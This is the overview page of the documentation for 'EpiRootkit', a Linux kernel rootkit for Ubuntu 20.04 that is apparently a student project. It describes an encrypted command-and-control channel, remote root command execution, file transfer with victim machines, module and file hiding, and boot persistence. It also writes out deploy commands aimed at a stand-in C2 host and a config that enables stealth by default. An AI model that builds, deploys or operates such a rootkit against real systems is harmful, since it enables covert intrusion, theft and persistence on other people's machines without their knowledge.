---
title: "EpiRootkit Overview"
description: "Linux kernel rootkit for Ubuntu 20.04 / kernel 5.4.0"
icon: "shield"
date: "2025-05-25T16:00:00+01:00"
lastmod: "2025-05-25T16:00:00+01:00"
draft: false
toc: true
weight: 501
---

# EpiRootkit

Linux kernel rootkit implementation for Ubuntu 20.04 LTS (kernel 5.4.0).

## Features

- **C2 Communication**: TCP connection with domain support and XOR encryption
- **DNS Resolution**: Kernel-space domain name resolution
- **Remote Commands**: Execute shell commands with output capture
- **File Transfer**: Upload/download files between C2 and victim
- **Authentication**: SHA-512 password verification with rate limiting
- **XOR Encryption**: 32-byte key encryption for all C2 traffic
- **Stealth**: Hide module from `lsmod` and files from directory listings
- **Persistence**: Multiple mechanisms to survive reboots

## Quick Demo

```bash
# 1. Build and deploy with XOR encryption enabled
cd rootkit && make
sudo ./deploy_rootkit.sh address=c2.example.com port=443

# 2. Start C2 server  
cd attacking_program && pnpm start

# 3. Use rootkit (all communication XOR encrypted)
auth Client-1 password
# SUCCESS: Authentication successful

exec Client-1 whoami
# Exit code: 0
# Output: root

status Client-1
# EpiRootkit Status: Version 1.0.0, Module Hidden: YES, Encryption: XOR
```

## Architecture

### Core Components
- **Network Layer**: Connection management and DNS resolution
- **Command System**: Authentication and remote execution
- **Stealth Features**: Module and file hiding
- **Persistence**: Boot survival mechanisms

### Communication Flow
```
C2 Server  ←→  Network/DNS  ←→  EpiRootkit  ←→  Linux Kernel
(Node.js)      (TCP/UDP)       (Module)        (System Calls)
```

## Technical Stack

- **Target**: Ubuntu 20.04 LTS, kernel 5.4.0, x86_64
- **Language**: C (kernel module) + Node.js (C2 server)
- **APIs**: ftrace, kretprobe, VFS, UDP sockets
- **Network**: TCP (C2) + UDP (DNS resolution)
- **Encryption**: XOR cipher with 32-byte hardcoded key
- **Authentication**: SHA-512 with rate limiting (5 attempts/60s)

## Configuration

Edit `rootkit/core/config.h`:
```c
#define C2_SERVER_ADDRESS "c2.example.com"  // Domain or IP
#define C2_SERVER_PORT 4444
#define ENABLE_PERSISTENCE 1       // Auto-install persistence
#define ENABLE_MODULE_HIDING 1     // Hide by default
#define ENABLE_FILE_HIDING 1       // Hide files with prefixes
```

## Documentation

- **[Deployment](./deployment.md)**: Build and load with domain support
- **[Connection](./connection-authentication.md)**: Network communication and XOR encryption
- **[XOR Encryption](./features/encryption.md)**: XOR encryption implementation
- **[DNS Resolution](./features/dns-resolution.md)**: Domain name resolution
- **[Commands](./features/command-execution.md)**: Remote command execution
- **[File Transfer](./features/file-transfer.md)**: Upload/download files
- **[Stealth](./features/hiding.md)**: Module and file hiding
- **[Persistence](./features/persistence.md)**: Boot survival mechanisms


